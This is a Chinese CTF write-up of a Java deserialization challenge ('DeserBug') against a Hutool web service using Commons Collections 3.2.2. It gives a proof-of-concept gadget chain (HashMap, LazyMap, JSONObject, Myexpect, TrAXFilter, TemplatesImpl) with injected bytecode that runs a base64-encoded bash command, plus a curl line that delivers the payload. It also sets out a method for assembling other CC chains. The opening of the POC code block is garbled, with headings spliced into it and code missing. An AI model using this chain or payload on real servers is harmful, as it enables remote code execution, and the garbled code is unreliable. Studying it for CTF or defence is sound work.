# CTF - DeserBug

## 目录

- [题目分析](#题目分析)
- [漏洞分析](#漏洞分析)
- [解题思路](#解题思路)
- [完整POC实现](#完整poc实现)
- [关键机制解析](#关键机制解析)
- [CC链演变分析](#cc链演变分析)

---

## 题目分析

### 题目环境

- **Web服务**: Hutool HTTP Server (端口8888)
- **依赖**: Commons Collections 3.2.2 (带安全检查) hutool-all-5.8.18
- **JDK**: JDK1.8.0_202
- **提示**: `cn.hutool.json.JSONObject.put` → `com.app.Myexpect#getAnyexcept`

### 题目提供的关键文件

#### 1. Testapp.java - 存在反序列化漏洞的Web服务

```java
public class Testapp {
    public static void main(String[] args) {
        HttpUtil.createServer(8888).addAction("/", (request, response) -> {
            String bugstr = request.getParam("bugstr");
            try {
                // 【漏洞点】直接反序列化用户输入
                byte[] decode = Base64.getDecoder().decode(bugstr);
                ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decode));
                Object object = ois.readObject();
                result = object.toString();
            } catch (Exception e) {
                // 【关键提示】异常处理中使用Myexpect
                Myexpect myexpect = new Myexpect();
                myexpect.setTypeparam(new Class[]{String.class});
                myexpect.setTypearg(new String[]{e.toString()});
                myexpect.setTargetclass(e.getClass());
                result = myexpect.getAnyexcept().toString();
            }
            response.write(result, ContentType.TEXT_PLAIN.toString());
        }).start();
    }
}
```

#### 2. Myexpect.java - 题目提供的反射工具类

```java
public class Myexpect extends Exception {
    private Class targetclass;      // 目标类
    private Class[] typeparam;      // 构造器参数类型
    private Object[] typearg;       // 构造器参数值
    
    // 【核心方法】通过反射调用任意构造器
    public Object getAnyexcept() throws Exception {
        Constructor con = targetclass.getConstructor(typeparam);
        return con.newInstance(typearg);
    }
    
    // Getter/Setter省略...
}
```

---

## 漏洞分析

### 漏洞点

```java
// Testapp.java - 反序列化入口
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decode));
Object object = ois.readObject();  // 危险的反序列化操作
```

### 题目约束

Commons Collections 3.2.2 的安全限制：

- ❌ `InvokerTransformer` - 反射调用方法（已禁用）
- ❌ `InstantiateTransformer` - 反射调用构造器（已禁用）
- ✅ `ConstantTransformer` - 仅返回常量（可用）

### 突破点

题目提供的 `Myexpect` 类：

- ✅ 可序列化（继承自Exception）
- ✅ 提供 `getAnyexcept()` 方法反射调用任意构造器
- ✅ 不受CC 3.2.2安全检查限制

**关键提示**：`cn.hutool.json.JSONObject.put` → `com.app.Myexpect#getAnyexcept`

---

## 解题思路

### 核心思路

使用 `Myexpect` 替代被禁用的 `InstantiateTransformer`，利用 Hutool JSONObject 的 JSON 序列化机制自动触发 getter 方法。

### 技术选型

| 组件 | 选择 | 原因 |
|------|------|------|
| 触发方式 | CC6 (HashMap + TiedMapEntry + LazyMap) | JDK通用，触发稳定 |
| 攻击目标 | CC3 (TrAXFilter + TemplatesImpl) | 构造器触发，适配Myexpect |
| 绕过手段 | ConstantTransformer + JSONObject | 返回Myexpect对象，JSON序列化触发getter |

### 完整利用链

```
HashMap.readObject()
  → TiedMapEntry.hashCode()
    → LazyMap.get(key)
      → ConstantTransformer.transform()  // 返回Myexpect对象
        → JSONObject.put(key, myexpect)  // JSON序列化触发
          → Myexpect.getAnyexcept()      // 反射调用构造器
            → new TrAXFilter(templates)
              → TemplatesImpl.newTransformer()
                → 加载恶意字节码 → RCE ✅
```

---

### MyPOC.java (题目答案)

```java
publiPOC实现

### MyPOC.java节码（执行命令）
        byte[] bytes = getTemplates();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "1");
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        
        // 步骤2: 配置Myexpect调用TrAXFilter构造器
        Myexpect myexpect = new Myexpect();
        myexpect.setTargetclass(TrAXFilter.class);           // 目标类
        myexpect.setTypeparam(new Class[]{Templates.class}); // 参数类型
        myexpect.setTypearg(new Object[]{templates});        // 参数值
        
        // 步骤3: 构造LazyMap触发链
        JSONObject jsonObject = new JSONObject();
        ConstantTransformer transformer = new ConstantTransformer(1);
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(jsonObject, transformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "111");
        
        // 步骤4: 利用HashMap触发
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "1");
        jsonObject.remove("111");  // 确保LazyMap.get()会调用transform
        
        // 步骤5: 替换ConstantTransformer的返回值为Myexpect
        setFieldValue(transformer, "iConstant", myexpect);
        
        // 步骤6: 序列化并生成payload
        byte[] serialize = serialize(hashMap);
        System.out.println(Base64.getEncoder().encodeToString(serialize));
    }
    
    // 生成恶意字节码
    public static byte[] getTemplates() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass template = pool.makeClass("Test");
        template.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        String block = "Runtime.getRuntime().exec(\"bash -c {echo,b3BlbiAtYSBDYWxjdWxhdG9y}|{base64,-d}|{bash,-i}\");";
        template.makeClassInitializer().insertBefore(block);
        return template.toBytecode();
    }
}
```

### POC关键点解析

#### 1. 时序控制

```java
hashMap.put(tiedMapEntry, "1");   // 构造时触发，避免污染序列化数据
jsonObject.remove("111");          // 清除key，确保反序列化时触发transform
setFieldValue(transformer, "iConstant", myexpect);  // 替换返回值
```

#### 2. 使用方法

```bash
javac -cp "lib/*:src" src/com/app/MyPOC.java
java -cp "lib/*:src" com.app.MyPOC
curl "http://target:8888/?bugstr=<base64_payload>"
```

---

## 关键机制解析

### 1. JSONObject.put 为什么能触发 getAnyexcept()？

这是本题的核心突破点。

#### Java Bean 规范

```java
public class Myexpect extends Exception {
    public Object getAnyexcept() throws Exception { ... }  // ✅ 符合getter规范
    // 特征：以"get"开头、无参数、有返回值
}
```

#### Hutool JSON序列化机制

```java
// JSONObject.put() 内部逻辑
public JSONObject put(String key, Object value) {
    if (value是自定义对象) {
        // 调用BeanUtil.beanToMap()
        // 1. 反射获取所有public方法
        // 2. 过滤出getter方法 (method.getName().startsWith("get"))
        // 3. 逐个调用getter获取属性值
        // 4. getAnyexcept()也会被调用！✅
    }
    return this;
}
```

#### 触发时机

```java
LazyMap.get("111")
  → transformer.transform("111")     // 返回Myexpect对象
    → jsonObject.put("111", myexpect)  // ← 触发点
      → BeanUtil.beanToMap(myexpect)
        → getAnyexcept() 被调用！✅
```

**关键点**：使用 JSONObject 作为 LazyMap 的底层 Map

- 普通HashMap不会触发getter
- JSONObject.put 会序列化对象，自动调用所有getter

---

### 2. jsonObject.remove("111") 的作用

#### 嵌套结构

```
HashMap
  └─ key: TiedMapEntry
       └─ map: LazyMap
            └─ map: JSONObject (底层存储)
```

#### 执行时序

**构造阶段**：

```java
hashMap.put(tiedMapEntry, "1");  
// → lazyMap.get("111")
// → jsonObject.put("111", 1)  // jsonObject现在包含"111"
```

**清理阶段**：

```java
jsonObject.remove("111");  // 从JSONObject移除"111"
```

**反序列化阶段**：

```java
// 因为jsonObject不包含"111"
lazyMap.get("111")
  → !jsonObject.containsKey("111")  // true
  → transformer.transform("111")     // 会被调用
```

**如果不remove**：`LazyMap.get()` 直接返回已存在的值，不会调用 `transform()`，攻击失败。

---

### 3. 为什么选择 TrAXFilter + TemplatesImpl？

#### Myexpect 的限制

```java
public Object getAnyexcept() throws Exception {
    Constructor con = targetclass.getConstructor(typeparam);
    return con.newInstance(typearg);  // 只能调用构造器
}
```

#### Runtime.exec() 不可行

```java
public class Runtime {
    private Runtime() {}  // 构造器private
    public static Runtime getRuntime() { ... }  // 需要静态方法
    public Process exec(String command) { ... }  // 需要方法调用
}
```

- Myexpect只能调用构造器，无法调用普通方法
- Runtime构造器是private的

#### TrAXFilter 完美适配

```java
public TrAXFilter(Templates templates) {
    _transformer = templates.newTransformer();  // 构造器中自动触发！
}
```

- 构造器是public的 ✅
- 构造器内部自动调用 `templates.newTransformer()` ✅
- 触发 TemplatesImpl 字节码加载 ✅

---

## 反序列化链拼接原理

### 链的基本结构

任何反序列化攻击链都可以分解为三个独立模块：

```
[触发器 Trigger] → [传递机制 Chain] → [攻击目标 Sink]
       ↓                 ↓                  ↓
    入口点          Transformer          危险操作
```

### 常见组件分类

#### 1. 触发器（Trigger）- 决定何时执行

| 触发器 | 入口方法 | JDK要求 | 稳定性 |
|--------|---------|---------|--------|
| **HashMap** | readObject() → hash() → hashCode() | 任意版本 | ⭐⭐⭐⭐⭐ 最稳定 |
| **PriorityQueue** | readObject() → heapify() → compare() | 任意版本 | ⭐⭐⭐⭐ |
| **BadAttributeValueExpException** | readObject() → toString() | 任意版本 | ⭐⭐⭐ |
| **AnnotationInvocationHandler** | readObject() → entrySet() → setValue() | ≤JDK 8u71 | ⭐⭐ JDK限制 |

#### 2. 传递机制（Chain）- 如何传递到目标

| 传递机制 | 特点 | CC版本要求 |
|---------|------|-----------|
| **LazyMap** | 延迟加载，访问不存在的key触发 | 任意版本 |
| **TransformedMap** | 修改value时触发 | 任意版本 |
| **ChainedTransformer** | 链式调用多个Transformer | 任意版本 |
| **InvokerTransformer** | 反射调用方法 | ≤3.2.1 |
| **InstantiateTransformer** | 反射调用构造器 | ≤3.2.1 |
| **ConstantTransformer** | 返回常量 | 任意版本 |

#### 3. 攻击目标（Sink）- 最终执行什么

| 攻击目标 | 触发方式 | 特点 |
|---------|---------|------|
| **Runtime.exec()** | 方法调用 | 直接但容易被拦截 |
| **TemplatesImpl字节码** | 构造器或方法触发 | 隐蔽，绕过SecurityManager |
| **URLClassLoader** | 加载远程类 | 需要网络访问 |
| **JNDI注入** | lookup()调用 | 强大但有JDK版本限制 |

---

### 拼接三原则

#### 原则1：接口匹配

触发器必须能调用传递机制的入口方法

```java
// ✅ 正确：HashMap.hash() 调用 TiedMapEntry.hashCode()
HashMap → TiedMapEntry.hashCode() → LazyMap.get()

// ❌ 错误：HashMap不会调用toString()
HashMap → BadAttributeValueExpException.toString()  // 不匹配！
```

#### 原则2：参数兼容

上一步的输出必须是下一步的输入

```java
// ✅ 正确：transform()接受Object返回Object，可以链式调用
ConstantTransformer.transform()  → 返回 TrAXFilter.class (Object)
  ↓
InstantiateTransformer.transform(Object)  → 接受 Class 对象

// ❌ 错误：类型不匹配
ConstantTransformer → 返回String
  ↓
InstantiateTransformer → 需要Class对象  // 类型不匹配！
```

#### 原则3：版本限制

检查每个组件的可用性

```java
// CC 3.2.2 环境
✅ LazyMap、ConstantTransformer、HashMap  // 可用
❌ InvokerTransformer、InstantiateTransformer  // 被禁用
```

---

### 经典组合示例

#### 组合1：CC6 = HashMap触发 + InvokerTransformer链 + Runtime.exec()

```java
// [触发器] HashMap
HashMap hashMap = new HashMap();
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
hashMap.put(entry, "value");

// [传递机制] LazyMap + InvokerTransformer链
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", ...),
    new InvokerTransformer("invoke", ...),
    new InvokerTransformer("exec", ...)
};
LazyMap lazyMap = LazyMap.decorate(new HashMap(), new ChainedTransformer(transformers));

// [攻击目标] Runtime.exec()
// 调用链：
// HashMap.readObject() → TiedMapEntry.hashCode() → LazyMap.get() 
// → ChainedTransformer → Runtime.exec()
```

#### 组合2：CC3 = TransformedMap触发 + InstantiateTransformer + TemplatesImpl

```java
// [触发器] AnnotationInvocationHandler + TransformedMap
Map<String, Object> innerMap = new HashMap<>();
innerMap.put("value", "test");
Map transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);

// [传递机制] InstantiateTransformer
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(TrAXFilter.class),
    new InstantiateTransformer(
        new Class[]{Templates.class},
        new Object[]{templates}
    )
};

// [攻击目标] TemplatesImpl字节码加载
// 调用链：
// AnnotationInvocationHandler.readObject() → TransformedMap.setValue()
// → ChainedTransformer → InstantiateTransformer 
// → new TrAXFilter(templates) → templates.newTransformer() → 字节码加载
```

#### 组合3：CC6触发 + CC3攻击（本项目的CC6TriggerCC3Attack）

```java
// [触发器] 借用CC6的HashMap触发（更稳定）
HashMap hashMap = new HashMap();
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");

// [传递机制] InstantiateTransformer（CC3的）
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(TrAXFilter.class),
    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
};

// [攻击目标] 借用CC3的TemplatesImpl（更隐蔽）
// 调用链：
// HashMap.readObject() ← CC6的触发
//   → TiedMapEntry.hashCode()
//   → LazyMap.get()
//   → InstantiateTransformer ← CC3的传递
//   → new TrAXFilter(templates) ← CC3的攻击目标
//   → templates.newTransformer()
```

**为什么这样组合？**
- CC6的触发方式（HashMap）比CC3（AnnotationInvocationHandler）更稳定
- CC3的攻击目标（TemplatesImpl）比CC6（Runtime.exec）更隐蔽

---

### 实战拼接步骤

#### 步骤1：确定环境约束

```java
// 检查清单
□ JDK版本？
□ Commons Collections版本？
□ 是否有SecurityManager？
□ 是否有其他防护措施？
```

#### 步骤2：选择触发器

```java
// 优先级
1. HashMap（最通用）
2. PriorityQueue（需要Comparator）
3. BadAttributeValueExpException（依赖toString）
```

#### 步骤3：选择攻击目标

```java
// 根据环境选择
if (需要绕过SecurityManager) {
    使用 TemplatesImpl字节码加载
} else if (简单直接) {
    使用 Runtime.exec()
}
```

#### 步骤4：构建传递链

```java
// 根据约束选择
if (CC版本 <= 3.2.1) {
    可用 InvokerTransformer、InstantiateTransformer
} else {
    只能用 ConstantTransformer + 自定义类（如Myexpect）
}
```

#### 步骤5：测试验证

```java
// 1. 本地测试序列化
byte[] payload = serialize(gadget);

// 2. 反序列化验证
deserialize(payload);  // 观察是否触发

// 3. 调试跟踪
// 在关键方法打断点，确认调用链正确
```

---

### 拼接核心思路总结

1. **模块化思维**：把链分解为触发、传递、攻击三个独立模块
2. **接口匹配**：确保上下游方法能正确调用
3. **灵活组合**：取不同链的优点进行组合
4. **创新绕过**：遇到限制时寻找替代方案

**记住**：反序列化链不是固定的，可以像乐高积木一样自由拼接。关键是理解每个组件的功能和接口，然后根据环境约束进行创新组合。

---

## 从CC3/CC6到MyPOC的改造思路

本题目是基于经典的CC3和CC6链进行改造的CTF题目。理解原始链和改造思路是解题关键。

### CC3链原理 (PureCC3POC.java)

#### 核心组件

```java
// 使用 InstantiateTransformer 调用构造器
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(TrAXFilter.class),
    new InstantiateTransformer(
        new Class[]{Templates.class},
        new Object[]{templates}
    )
};
```

#### 调用链

```
AnnotationInvocationHandler.readObject()
  → TransformedMap.setValue()
    → ChainedTransformer.transform()
      → ConstantTransformer → 返回TrAXFilter.class
      → InstantiateTransformer.transform()
        → Constructor.newInstance(templates)  // 反射调用构造器
        → new TrAXFilter(templates)
          → templates.newTransformer() → RCE
```

#### CC 3.2.2失败原因

```java
// InstantiateTransformer.readObject()
private void readObject(ObjectInputStream is) {
    FunctorUtils.checkUnsafeSerialization(InstantiateTransformer.class);  // ❌ 抛异常
}
```

还有AnnotationInvocationHandler在JDK 8u71+后失效，本题目使用的是jdk1.8.0_202

---

### CC6链原理 (PureCC6POC.java)

#### 核心组件

```java
// 使用 InvokerTransformer 直接反射调用方法
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", ...),    // 获取方法
    new InvokerTransformer("invoke", ...),       // 调用方法
    new InvokerTransformer("exec", ...)          // 执行命令
};

// 使用 HashMap + TiedMapEntry + LazyMap 触发
HashMap hashMap = new HashMap();
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
hashMap.put(entry, "value");
```

#### 调用链

```
HashMap.readObject()
  → hash(key)
    → TiedMapEntry.hashCode()
      → getValue()
        → LazyMap.get(key)
          → ChainedTransformer.transform()
            → InvokerTransformer链式调用 → Runtime.exec() → RCE
```

#### CC 3.2.2失败原因

```java
// InvokerTransformer.readObject()
private void readObject(ObjectInputStream is) {
    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);  // ❌ 抛异常
}
```

---

### MyPOC的改造思路

#### 问题分析

在CC 3.2.2中，两个关键Transformer被禁用：

- ❌ `InstantiateTransformer` - 不能用来反射调用构造器
- ❌ `InvokerTransformer` - 不能用来反射调用方法
- ✅ `ConstantTransformer` - 只能返回常量，看似无用

#### 改造策略

**借鉴CC6的触发方式 + 借鉴CC3的攻击目标 + 创新突破点**

| 方面 | CC3 | CC6 | MyPOC (改造版) |
|------|-----|-----|---------------|
| **触发器** | AnnotationInvocationHandler + TransformedMap | HashMap + TiedMapEntry + LazyMap | ✅ 采用CC6（更稳定） |
| **攻击目标** | TrAXFilter构造器 → TemplatesImpl | Runtime.exec() | ✅ 采用CC3（绕过安全管理器） |
| **核心Transformer** | InstantiateTransformer | InvokerTransformer | ❌ 都被禁用 |
| **突破方法** | - | - | ✅ Myexpect + JSONObject |

#### 改造步骤详解

**步骤1: 选择触发链 - 借鉴CC6**

```java
// MyPOC采用CC6的触发方式（更稳定，JDK通用）
HashMap hashMap = new HashMap();
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "111");
hashMap.put(tiedMapEntry, "1");
```

✅ **原因**：HashMap.readObject()触发比AnnotationInvocationHandler更稳定

**步骤2: 选择攻击目标 - 借鉴CC3**

```java
// 目标：调用 new TrAXFilter(templates)
Myexpect myexpect = new Myexpect();
myexpect.setTargetclass(TrAXFilter.class);
myexpect.setTypeparam(new Class[]{Templates.class});
myexpect.setTypearg(new Object[]{templates});
```

✅ **原因**：TemplatesImpl方式不依赖SecurityManager，更通用

**步骤3: 替换危险Transformer - 关键创新**

传统方法（已失效）：

```java
❌ new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
   // InstantiateTransformer被禁用
```

改造方法（绕过）：

```java
// 1. 使用Myexpect替代InstantiateTransformer的功能
public Object getAnyexcept() throws Exception {
    Constructor con = targetclass.getConstructor(typeparam);
    return con.newInstance(typearg);  // 同样能反射调用构造器！
}

// 2. 使用ConstantTransformer返回Myexpect对象
ConstantTransformer transformer = new ConstantTransformer(1);
setFieldValue(transformer, "iConstant", myexpect);  // 返回自定义对象

// 3. 触发getAnyexcept() - 利用JSON序列化
```

**步骤4: 触发getAnyexcept() - 最巧妙的创新**

问题：`ConstantTransformer`只是返回对象，如何调用`getAnyexcept()`？

解决方案：

```java
// 使用JSONObject作为LazyMap的底层Map
JSONObject jsonObject = new JSONObject();
LazyMap lazyMap = LazyMap.decorate(jsonObject, transformer);

// 当LazyMap.get()触发时：
// 1. transformer.transform() 返回 myexpect对象
// 2. jsonObject.put(key, myexpect)  ← 关键！
// 3. JSONObject序列化myexpect时会调用所有getter
// 4. getAnyexcept()被自动调用！
```

#### 完整对比

```java
// ========== CC3 (失效) ==========
TransformedMap.setValue()
  → InstantiateTransformer.transform()  ❌ 被禁用
    → new TrAXFilter(templates)

// ========== CC6 (失效) ==========
LazyMap.get()
  → InvokerTransformer.transform()  ❌ 被禁用
    → Runtime.exec()

// ========== MyPOC (成功) ==========
LazyMap.get()
  → ConstantTransformer.transform()  ✅ 未被禁用
    → 返回 Myexpect对象
      → JSONObject.put(key, myexpect)
        → 触发JSON序列化
          → 调用 getAnyexcept()  ✅ 自定义方法，不受限制
            → Constructor.newInstance()
              → new TrAXFilter(templates)
                → templates.newTransformer() → RCE ✅
```

---

### 改造要点总结

#### 1. 触发方式：CC6 > CC3

- CC3的`AnnotationInvocationHandler`在JDK 8u71+后对memberValues类型进行安全检查而失效
- CC6的`HashMap + TiedMapEntry`更通用，能适应高版本JDK

```
HashMap.readObject()
  → hash(key)  
  → TiedMapEntry.hashCode()
  → TiedMapEntry.getValue()
  → LazyMap.get(key)
  → transform(key)
```

#### 2. 攻击目标：CC3 > CC6

- CC6直接调用`Runtime.exec()`容易被SecurityManager拦截，并且题目中使用的Myexpect只能调用构造器，不能调用普通方法。
- CC3的`TemplatesImpl`字节码加载更隐蔽

**为什么不能直接用Runtime.exec()？**

有人可能会问：既然Myexpect能反射调用构造器，为什么不直接调用Runtime.exec()，而要用TemplatesImpl？

原因如下：

1. **Myexpect的限制**：

```java
public Object getAnyexcept() throws Exception {
    Constructor con = targetclass.getConstructor(typeparam);
    return con.newInstance(typearg);  // 只能调用构造器！
}
```

Myexpect只能调用构造器，不能调用普通方法。

1. **Runtime的限制**：

```java
public class Runtime {
    private Runtime() {}  // 构造器是private的！
    
    public static Runtime getRuntime() { ... }  // 需要通过静态方法获取实例
    
    public Process exec(String command) { ... }  // 需要先获取实例再调用
}
```

- Runtime的构造器是private的，无法通过`new Runtime()`创建
- 必须先调用`Runtime.getRuntime()`获取实例
- 然后才能调用`exec()`方法

1. **执行流程对比**：

```java
// ❌ 无法实现 - Runtime.exec()需要两步
myexpect.setTargetclass(Runtime.class);  // 构造器private，无法调用
// 即使能获取实例，也无法调用exec()方法（Myexpect只调用构造器）

// ✅ 可以实现 - TrAXFilter在构造器中触发
myexpect.setTargetclass(TrAXFilter.class);
myexpect.setTypeparam(new Class[]{Templates.class});
myexpect.setTypearg(new Object[]{templates});
// 调用: new TrAXFilter(templates)
// 构造器内部自动调用 templates.newTransformer() → 加载字节码 → RCE
```

4. **TrAXFilter的优势**：

```java
// TrAXFilter构造器源码
public TrAXFilter(Templates templates) throws TransformerConfigurationException {
    _templates = templates;
    _transformer = templates.newTransformer();  // 构造器中就触发！
}
```

TrAXFilter的构造器会自动调用`templates.newTransformer()`，完美适配Myexpect只能调用构造器的限制。

**可选的攻击目标**：

虽然不能用Runtime.exec()，但还有其他选择：

| 攻击目标 | 触发方式 | 优点 | 缺点 |
|---------|---------|------|------|
| TrAXFilter → TemplatesImpl | 构造器触发 | ✅ 隐蔽、绕过安全管理器 | 需要字节码 |
| ProcessBuilder → start() | ❌ 需要调用方法 | 直观 | ❌ Myexpect不支持 |
| ScriptEngineManager | 构造器触发 | 可执行脚本 | 依赖nashorn |
| JNDI注入相关类 | 构造器触发 | 远程加载 | 需要外部服务 |

**结论**：MyPOC选择TrAXFilter → TemplatesImpl是因为：

- ✅ 适配Myexpect只能调用构造器的限制
- ✅ 在构造器中就能触发恶意代码
- ✅ 不依赖SecurityManager配置
- ✅ 字节码加载更隐蔽

#### 3. 绕过安全检查：关键创新

| 传统方法 | 状态 | 改造方法 | 状态 |
|---------|------|---------|------|
| InstantiateTransformer | ❌ 禁用 | Myexpect.getAnyexcept() | ✅ 可用 |
| InvokerTransformer | ❌ 禁用 | Myexpect.getAnyexcept() | ✅ 可用 |
| 直接调用 | - | JSONObject触发getter | ✅ 创新 |

#### 4. 利用链组合

```
CC6的触发器 + CC3的攻击目标 + 自定义绕过 = MyPOC
```

---

### 触发方式选择：为什么使用CC6？

**CC6的触发机制**：

```
HashMap.readObject()
  → hash(key)  
  → TiedMapEntry.hashCode()
  → TiedMapEntry.getValue()
  → LazyMap.get(key)
  → transform(key)
```

**选择CC6的原因**：

1. **JDK兼容性最好**
   - HashMap反序列化机制是Java基础功能
   - 不依赖特定JDK版本的实现细节
   - CC1、CC3等用到的AnnotationInvocationHandler在JDK 8u71+后对memberValues类型进行安全检查而失效

2. **触发稳定可靠**
   - HashMap.readObject()必然调用hash(key)
   - 不像CC1/CC3中的TransformedMap需要key为"value"才能触发（因为@Retention注解只有value()成员方法）

---

### 核心要点

1. **题目约束**: CC 3.2.2禁用了`InvokerTransformer`和`InstantiateTransformer`
2. **突破方法**: 利用题目提供的`Myexpect`类替代危险Transformer
3. **触发机制**: Hutool JSON序列化时自动调用getter方法`getAnyexcept()`
4. **利用链**: HashMap → TiedMapEntry → LazyMap → ConstantTransformer → Myexpect → TrAXFilter → TemplatesImpl

### 关键技术

- **反射调用构造器**: `Myexpect.getAnyexcept()`
- **LazyMap延迟加载**: 访问不存在的key触发transform
- **TemplatesImpl字节码加载**: 静态代码块执行命令
- **时序控制**: 先put后remove再替换，确保反序列化时正确触发

